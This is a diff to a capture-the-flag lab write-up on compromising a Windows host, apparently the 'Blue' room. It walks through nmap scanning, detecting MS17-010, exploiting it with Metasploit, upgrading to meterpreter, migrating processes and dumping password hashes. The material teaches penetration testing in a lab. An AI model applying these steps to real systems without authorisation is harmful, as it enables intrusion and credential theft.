@@ -10,7 +10,7 @@ Deploy & hack into a Windows machine, leveraging common misconfigurations issues
 ## Recon
 
 ```md
-root@ip-10-66-81-158:~# nmap 10.66.190.219
+root@ip-10-66-81-158:~# nmap `<Target IP>`
 
 PORT      STATE SERVICE
 135/tcp   open  msrpc
@@ -27,7 +27,7 @@ PORT      STATE SERVICE
 Increase fidelity 
 
 ```md
-root@ip-10-66-81-158:~# nmap 10.66.190.219 -sV -p 135,139,445,3389,49152,49153,49154,49158,49159
+root@ip-10-66-81-158:~# nmap `<Target IP>` -sV -p 135,139,445,3389,49152,49153,49154,49158,49159
 
 PORT      STATE SERVICE      VERSION
 135/tcp   open  msrpc        Microsoft Windows RPC
@@ -48,7 +48,7 @@ Nmap done: 1 IP address (1 host up) scanned in 67.03 seconds
 Identify vulnerabilities with the default script.  
 
 ```md
-root@ip-10-66-81-158:~# nmap 10.66.190.219 -sV -p 135,139,445,3389,49152,49153,49154,49158,49159 -sC
+root@ip-10-66-81-158:~# nmap `<Target IP>` -sV -p 135,139,445,3389,49152,49153,49154,49158,49159 -sC
 
 PORT      STATE SERVICE        VERSION
 135/tcp   open  msrpc          Microsoft Windows RPC
@@ -93,7 +93,7 @@ Nmap done: 1 IP address (1 host up) scanned in 147.78 seconds
 The open RDP port invites exploration of rdp vulnerabilities.  
 
 ```md
-root@ip-10-66-81-158:~# nmap 10.66.190.219 -sV -p 135,139,445,3389,49152,49153,49154,49158,49159 --script=rdp-enum-encryption --script=rdp-ntlm-info --script=rdp-vuln-ms12-020
+root@ip-10-66-81-158:~# nmap `<Target IP>` -sV -p 135,139,445,3389,49152,49153,49154,49158,49159 --script=rdp-enum-encryption --script=rdp-ntlm-info --script=rdp-vuln-ms12-020
 
 PORT      STATE SERVICE        VERSION
 135/tcp   open  msrpc          Microsoft Windows RPC
@@ -141,14 +141,14 @@ Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 89.13 seconds
-
 ```
+
 Not interested in Denial of Service... but ...  
 
 The Open SMB port invites more scripts..
 
 ```md
-root@ip-10-66-81-158:~# nmap 10.66.190.219 -sV -p 135,139,445,3389 --script=smb-vuln-ms17-010
+root@ip-10-66-81-158:~# nmap `<Target IP>` -sV -p 135,139,445,3389 --script=smb-vuln-ms17-010
 
 PORT      STATE SERVICE        VERSION
 135/tcp   open  msrpc          Microsoft Windows RPC
@@ -181,20 +181,89 @@ Host script results: <-- clearly, the device is vulnerable
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 59.35 seconds
 
+Review the [Exploit Database](https://www.exploit-db.com/exploits/41891) and notice the only proof of concept specifically requires the use of Metasploit.
+
 ```
 
 ## Initial Access
 
-Identify the presence of `smbclient` on the attackbox.
+start the metasploit framework: `:> msfconsole`
 
-```md
-root@ip-10-66-81-158:~# which smbclient
-/usr/bin/smbclient
-root@ip-10-66-81-158:~# 
-```
+search for `2017-0143` to identify multiple possible exploits  
+![SMB Exploits](/assets/blue-101.png)  
 
-## Escalate
+Option `0` is the preferred option.  
+
+type `use 0` into the MSF command line prompt.  
+
+Show options to view and alter settings required to run the exploit.  
+
+Set the RHOST (Remot Host) to the `<Target IP>`: set RHOST `<Target IP>`  
+
+![Show Options](assets/blue-102.png)  
+
+Use the `run` command to initiate the exploit.  
+
+![execute](/assets/blue-103.png)
+
+use `whoami` to identify the targeted user
+
+![whoami](/assets/blue-104.png)
+
+Change directory to C:\ with `cd C:\`  
+List the contents of C:\ with `dir`  
+Read the contents of the flag file with `more flag1.txt`  
+
+![Flag](/assets/blue-105.png)  
+
+## Escalate  
+
+Background the current shell session: `CTRL + Z`
+
+Notice this has been assigned session 1.  
+
+![Backgrounding] (/assets/blue-106.png)
+
+Upgrade session 1 to a meterpreter shell using [Metasploit Instructions](https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html) 
+
+Method 1: `sessions -u -1`
+
+Method 2: `use multi/manage/shell_to_meterpreter`
+
+![shell to meterpreter](/assets/blue-108.png)  
+
+List the sessions to observe the new meterpreter: `sessions`  
+
+![list sessions](/assets/blue-109.png)
+
+Switch to the meterpreter session: `sessions -i 2`  
+
+![switch session](assets/blue-110)  
+
+Identify running processes: `ps` to find the powershell PID  
+
+![process list](/assets/blue-111.png)
+
+Migrate to the process: `migrate <process ID>`  
+
+![migrate process](/assets/blue-112.png)  
+
 
 ## Cracking
 
+Dump the hashes: `hashdump`  
+![hashdump](/assets/blue-113.png)  
+Select you favorite cracking tool from a [variety of choices](https://www.infosecinstitute.com/resources/hacking/10-popular-password-cracking-tools/)
+
+
 ## FLags
+
+Find flag2.txt  
+![flag2.txt](assets/blue-114.png)
+
+Using powershell requires loading powershell with `load powershell`  
+
+Find flag3.txt with `powershell_execute` and `get-childitem`  
+
+![flag3](/assets/blue-115.png)
+
